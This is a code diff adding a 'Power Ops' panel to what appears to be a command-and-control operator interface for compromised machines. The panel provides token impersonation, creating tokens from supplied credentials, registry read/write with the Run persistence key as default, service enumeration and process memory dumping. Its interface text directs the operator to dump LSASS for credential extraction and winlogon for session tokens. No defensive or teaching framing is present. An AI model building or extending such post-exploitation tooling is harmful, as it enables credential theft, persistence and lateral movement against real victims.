@@ -508,6 +508,277 @@ function ModuleAccordion({ modules, running, onExec, search, onSearch }: {
   )
 }
 
+// ─── Power Ops — Token / Registry / Services / ProcDump ─────────────────────
+function PowerOps({ sessionId, osName }: { sessionId: string; osName: string }) {
+  const isWindows = osName.toLowerCase() === 'windows'
+  const [tab, setTab]   = useState<'token'|'registry'|'services'|'dump'>('token')
+  const [msg, setMsg]   = useState<string | null>(null)
+  const [loading, setLoading] = useState(false)
+
+  // ── Token state ──────────────────────────────────────────────────────────
+  const [tokenOwner, setTokenOwner] = useState<string | null>(null)
+  const [impUser, setImpUser]       = useState('')
+  const [mkUser, setMkUser]         = useState('')
+  const [mkPass, setMkPass]         = useState('')
+  const [mkDomain, setMkDomain]     = useState('')
+
+  // ── Registry state ───────────────────────────────────────────────────────
+  const [regHive, setRegHive]   = useState('HKCU')
+  const [regPath, setRegPath]   = useState('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')
+  const [regKey, setRegKey]     = useState('')
+  const [regKeys, setRegKeys]   = useState<string[]>([])
+  const [regVals, setRegVals]   = useState<string[]>([])
+  const [regResult, setRegResult] = useState<string | null>(null)
+  const [regWriteVal, setRegWriteVal] = useState('')
+  const [regWriteType, setRegWriteType] = useState(1)
+
+  // ── Services state ───────────────────────────────────────────────────────
+  const [services, setServices] = useState<{ name: string; display_name: string; status: number; bin_path: string; startup_type: number }[]>([])
+
+  // ── Dump state ───────────────────────────────────────────────────────────
+  const [dumpPid, setDumpPid] = useState('')
+
+  async function go_<T>(fn: () => Promise<T>, successMsg?: string) {
+    setLoading(true); setMsg(null)
+    try {
+      const r = await fn()
+      if (successMsg) setMsg('✓ ' + successMsg)
+      return r
+    } catch (e) { setMsg('✗ ' + e) }
+    finally { setLoading(false) }
+    return null
+  }
+
+  async function getTokenOwner() {
+    const r = await go_(() => apiFetch<{ owner: string }>(`/api/sessions/${sessionId}/token`))
+    if (r) setTokenOwner(r.owner)
+  }
+
+  async function doImpersonate() {
+    await go_(() => apiPost(`/api/sessions/${sessionId}/impersonate`, { username: impUser }), `Impersonating ${impUser}`)
+  }
+
+  async function doMakeToken() {
+    await go_(() => apiPost(`/api/sessions/${sessionId}/maketoken`, { username: mkUser, password: mkPass, domain: mkDomain }), 'Token created')
+  }
+
+  async function doRevToSelf() {
+    await go_(() => apiPost(`/api/sessions/${sessionId}/revtoself`, {}), 'Reverted to self')
+  }
+
+  async function loadRegKeys() {
+    const r = await go_(() => apiFetch<string[]>(`/api/sessions/${sessionId}/registry/keys?hive=${regHive}&path=${encodeURIComponent(regPath)}`))
+    if (r) setRegKeys(r)
+  }
+
+  async function loadRegValues() {
+    const r = await go_(() => apiFetch<string[]>(`/api/sessions/${sessionId}/registry/values?hive=${regHive}&path=${encodeURIComponent(regPath)}`))
+    if (r) setRegVals(r)
+  }
+
+  async function readRegValue() {
+    const r = await go_(() => apiFetch<{ value: string }>(`/api/sessions/${sessionId}/registry?hive=${regHive}&path=${encodeURIComponent(regPath)}&key=${encodeURIComponent(regKey)}`))
+    if (r) setRegResult(r.value)
+  }
+
+  async function writeRegValue() {
+    await go_(() => apiPost(`/api/sessions/${sessionId}/registry`, { hive: regHive, path: regPath, key: regKey, string_value: regWriteVal, type: regWriteType }), 'Value written')
+  }
+
+  async function deleteRegKey() {
+    if (!confirm(`Delete registry key ${regHive}\\${regPath}\\${regKey}?`)) return
+    await go_(() => apiFetch(`/api/sessions/${sessionId}/registry?hive=${regHive}&path=${encodeURIComponent(regPath)}&key=${encodeURIComponent(regKey)}`, { method: 'DELETE' }), 'Key deleted')
+  }
+
+  async function loadServices() {
+    const r = await go_(() => apiFetch<typeof services>(`/api/sessions/${sessionId}/services`))
+    if (r) setServices(r)
+  }
+
+  async function dumpProcess() {
+    if (!dumpPid.trim()) return
+    setLoading(true); setMsg(null)
+    try {
+      const url = `/api/sessions/${sessionId}/procdump`
+      const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ pid: parseInt(dumpPid) }) })
+      if (!res.ok) throw new Error(await res.text())
+      const blob = await res.blob()
+      const a = document.createElement('a'); a.href = URL.createObjectURL(blob)
+      a.download = `pid_${dumpPid}.dmp`; a.click()
+      setMsg(`✓ Dump downloaded: pid_${dumpPid}.dmp`)
+    } catch (e) { setMsg('✗ ' + e) }
+    finally { setLoading(false) }
+  }
+
+  const inputCls = 'flex-1 bg-bg border border-border rounded px-2 py-1 text-[10px] text-text font-mono focus:border-primary outline-none'
+  const btnCls   = 'px-3 py-1 rounded border border-primary/40 text-primary bg-primary/5 hover:bg-primary/15 text-[10px] transition-colors disabled:opacity-40 whitespace-nowrap'
+  const TABS_POW = isWindows
+    ? (['token','registry','services','dump'] as const)
+    : (['token','dump'] as const)
+
+  return (
+    <div className="flex flex-col h-full min-h-0">
+      {/* Tab bar */}
+      <div className="shrink-0 flex border-b border-border">
+        {TABS_POW.map(t => (
+          <button key={t} onClick={() => setTab(t as typeof tab)}
+            className={`px-4 py-2 text-[10px] border-b-2 transition-colors capitalize ${tab === t ? 'border-primary text-primary font-semibold' : 'border-transparent text-muted hover:text-text'}`}>
+            {t === 'token' ? '🔑 Tokens' : t === 'registry' ? '📋 Registry' : t === 'services' ? '⚙️ Services' : '💾 Procdump'}
+          </button>
+        ))}
+      </div>
+      {msg && <div className={`shrink-0 px-3 py-1 text-[9px] border-b border-border ${msg.startsWith('✓') ? 'text-primary bg-primary/5' : 'text-danger bg-danger/5'}`}>{msg}</div>}
+
+      <div className="flex-1 overflow-y-auto p-4 space-y-4">
+        {/* ── Token tab ─────────────────────────────────────────── */}
+        {tab === 'token' && (
+          <>
+            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
+              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Current Token</div>
+              <div className="flex items-center gap-2">
+                <button onClick={getTokenOwner} disabled={loading} className={btnCls}>Get Token Owner</button>
+                <button onClick={doRevToSelf} disabled={loading} className={`${btnCls} border-warn/40 text-warn bg-warn/5 hover:bg-warn/15`}>Rev To Self</button>
+                {tokenOwner && <span className="text-[10px] text-text font-mono">{tokenOwner}</span>}
+              </div>
+            </div>
+            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
+              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Impersonate User</div>
+              <div className="flex items-center gap-2">
+                <input value={impUser} onChange={e => setImpUser(e.target.value)} placeholder="DOMAIN\\username" className={inputCls} />
+                <button onClick={doImpersonate} disabled={loading || !impUser} className={btnCls}>Impersonate</button>
+              </div>
+            </div>
+            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
+              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Make Token (Pass-the-Credentials)</div>
+              <div className="grid grid-cols-3 gap-2">
+                <input value={mkUser} onChange={e => setMkUser(e.target.value)} placeholder="username" className={inputCls} />
+                <input type="password" value={mkPass} onChange={e => setMkPass(e.target.value)} placeholder="password" className={inputCls} />
+                <input value={mkDomain} onChange={e => setMkDomain(e.target.value)} placeholder="domain (optional)" className={inputCls} />
+              </div>
+              <button onClick={doMakeToken} disabled={loading || !mkUser || !mkPass} className={btnCls}>Create Token</button>
+            </div>
+          </>
+        )}
+
+        {/* ── Registry tab ─────────────────────────────────────── */}
+        {tab === 'registry' && isWindows && (
+          <>
+            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
+              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Registry Path</div>
+              <div className="flex items-center gap-2">
+                <select value={regHive} onChange={e => setRegHive(e.target.value)}
+                  className="bg-bg border border-border rounded px-2 py-1 text-[10px] text-text focus:border-primary outline-none shrink-0">
+                  {['HKCU','HKLM','HKCR','HKU','HKCC'].map(h => <option key={h}>{h}</option>)}
+                </select>
+                <input value={regPath} onChange={e => setRegPath(e.target.value)} placeholder="Path\To\Key" className={inputCls} />
+              </div>
+              <div className="flex items-center gap-2">
+                <input value={regKey} onChange={e => setRegKey(e.target.value)} placeholder="Value name (optional)" className={inputCls} />
+                <button onClick={loadRegKeys} disabled={loading} className={btnCls}>List Keys</button>
+                <button onClick={loadRegValues} disabled={loading} className={btnCls}>List Values</button>
+                <button onClick={readRegValue} disabled={loading || !regKey} className={btnCls}>Read</button>
+              </div>
+              {regResult && (
+                <div className="font-mono text-[10px] text-primary bg-bg p-2 rounded border border-border">{regResult}</div>
+              )}
+              {regKeys.length > 0 && (
+                <div className="flex flex-wrap gap-1">{regKeys.map(k => (
+                  <button key={k} onClick={() => setRegPath(regPath.replace(/\\+$/, '') + '\\' + k)}
+                    className="text-[9px] px-2 py-0.5 rounded border border-border text-muted hover:text-primary hover:border-primary/40 font-mono transition-colors">
+                    📁 {k}
+                  </button>
+                ))}</div>
+              )}
+              {regVals.length > 0 && (
+                <div className="flex flex-wrap gap-1">{regVals.map(v => (
+                  <button key={v} onClick={() => setRegKey(v)}
+                    className="text-[9px] px-2 py-0.5 rounded border border-border text-muted hover:text-primary hover:border-primary/40 font-mono transition-colors">
+                    🔑 {v}
+                  </button>
+                ))}</div>
+              )}
+            </div>
+            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
+              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Write / Delete</div>
+              <div className="flex items-center gap-2">
+                <input value={regWriteVal} onChange={e => setRegWriteVal(e.target.value)} placeholder="Value to write" className={inputCls} />
+                <select value={regWriteType} onChange={e => setRegWriteType(parseInt(e.target.value))}
+                  className="bg-bg border border-border rounded px-2 py-1 text-[10px] text-text focus:border-primary outline-none shrink-0">
+                  <option value={1}>REG_SZ</option><option value={4}>REG_DWORD</option><option value={11}>REG_QWORD</option>
+                </select>
+                <button onClick={writeRegValue} disabled={loading || !regKey || !regWriteVal} className={btnCls}>Write</button>
+                <button onClick={deleteRegKey} disabled={loading || !regKey}
+                  className="px-3 py-1 rounded border border-danger/40 text-danger bg-danger/5 hover:bg-danger/15 text-[10px] transition-colors disabled:opacity-40">
+                  Delete
+                </button>
+              </div>
+            </div>
+          </>
+        )}
+
+        {/* ── Services tab ─────────────────────────────────────── */}
+        {tab === 'services' && isWindows && (
+          <div className="bg-surface border border-border rounded-lg overflow-hidden">
+            <div className="flex items-center justify-between px-3 py-2 border-b border-border">
+              <span className="text-[9px] text-primary font-bold uppercase tracking-widest">Windows Services</span>
+              <button onClick={loadServices} disabled={loading} className={btnCls}>
+                {loading ? 'Loading…' : 'Load Services'}
+              </button>
+            </div>
+            {services.length > 0 && (
+              <div className="overflow-y-auto max-h-96">
+                <div className="grid text-[8px] font-bold text-muted/60 uppercase tracking-wider px-3 py-1 border-b border-border/30 bg-bg/40"
+                  style={{ gridTemplateColumns: '100px 1fr 60px 60px' }}>
+                  <span>Name</span><span>Binary Path</span><span>Status</span><span>Startup</span>
+                </div>
+                {services.map(s => (
+                  <div key={s.name} className="grid items-center px-3 py-1 border-b border-border/15 hover:bg-white/4 text-[10px]"
+                    style={{ gridTemplateColumns: '100px 1fr 60px 60px' }}>
+                    <div>
+                      <div className="font-mono text-text truncate">{s.name}</div>
+                      <div className="text-muted/60 text-[8px] truncate">{s.display_name}</div>
+                    </div>
+                    <span className="text-muted/70 font-mono text-[9px] truncate pr-2">{s.bin_path}</span>
+                    <span className={`text-[9px] font-bold ${s.status === 4 ? 'text-primary' : 'text-muted/60'}`}>
+                      {s.status === 4 ? 'RUNNING' : s.status === 1 ? 'STOPPED' : String(s.status)}
+                    </span>
+                    <span className="text-[9px] text-muted/60">
+                      {s.startup_type === 2 ? 'AUTO' : s.startup_type === 3 ? 'MAN' : s.startup_type === 4 ? 'DIS' : String(s.startup_type)}
+                    </span>
+                  </div>
+                ))}
+              </div>
+            )}
+            {services.length === 0 && !loading && (
+              <div className="p-4 text-muted text-xs text-center">Click "Load Services" to enumerate Windows services</div>
+            )}
+          </div>
+        )}
+
+        {/* ── Procdump tab ─────────────────────────────────────── */}
+        {tab === 'dump' && (
+          <div className="bg-surface border border-border rounded-lg p-3 space-y-3">
+            <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Process Memory Dump</div>
+            <p className="text-[10px] text-muted">Dump a process's memory to a .dmp file. Use LSASS (PID from Processes tab) for credential extraction.</p>
+            <div className="flex items-center gap-2">
+              <input value={dumpPid} onChange={e => setDumpPid(e.target.value)} placeholder="PID (e.g. 600 for lsass)" className={`${inputCls} max-w-[150px]`} />
+              <button onClick={dumpProcess} disabled={loading || !dumpPid.trim()} className={btnCls}>
+                {loading ? 'Dumping…' : '💾 Dump Process'}
+              </button>
+            </div>
+            <div className="text-[9px] text-muted bg-bg border border-border/50 rounded p-2">
+              Common PIDs to dump:<br/>
+              • <span className="text-accent">LSASS</span> — credentials (find PID in Processes tab → filter "lsass")<br/>
+              • <span className="text-accent">winlogon.exe</span> — session tokens<br/>
+              • <span className="text-accent">Any process</span> — memory analysis
+            </div>
+          </div>
+        )}
+      </div>
+    </div>
+  )
+}
+
 // ─── Process Manager ─────────────────────────────────────────────────────────
 function ProcessManager({ sessionId }: { sessionId: string }) {
   const { data, loading, error, refresh } = useAPI<ProcessInfo[]>(`/api/sessions/${sessionId}/ps`, 0)
@@ -734,14 +1005,15 @@ function Overview({ session, config, running, onExec, lastTask }: {
 }
 
 // ─── Nav item ─────────────────────────────────────────────────────────────────
-type ViewID = 'overview' | 'files' | 'procs' | 'network' | 'modules' | 'tasks'
+type ViewID = 'overview' | 'files' | 'procs' | 'network' | 'powerops' | 'modules' | 'tasks'
 const VIEWS: { id: ViewID; icon: React.ElementType; label: string }[] = [
-  { id: 'overview', icon: LayoutDashboard, label: 'Overview'   },
-  { id: 'files',    icon: FolderOpen,      label: 'Files'      },
-  { id: 'procs',    icon: Activity,        label: 'Processes'  },
-  { id: 'network',  icon: Wifi,            label: 'Network'    },
-  { id: 'modules',  icon: Package,         label: 'Modules'    },
-  { id: 'tasks',    icon: List,            label: 'Tasks'      },
+  { id: 'overview',  icon: LayoutDashboard, label: 'Overview'  },
+  { id: 'files',     icon: FolderOpen,      label: 'Files'     },
+  { id: 'procs',     icon: Activity,        label: 'Processes' },
+  { id: 'network',   icon: Wifi,            label: 'Network'   },
+  { id: 'powerops',  icon: Shield,          label: 'Power Ops' },
+  { id: 'modules',   icon: Package,         label: 'Modules'   },
+  { id: 'tasks',     icon: List,            label: 'Tasks'     },
 ]
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -971,6 +1243,9 @@ export default function OSPanel({ config, onOpenTerminal }: Props) {
             )}
             {view === 'network' && selId && (
               <NetworkView sessionId={selId} />
+            )}
+            {view === 'powerops' && selId && (
+              <PowerOps sessionId={selId} osName={config.name} />
             )}
             {view === 'modules' && (
               <ModuleAccordion
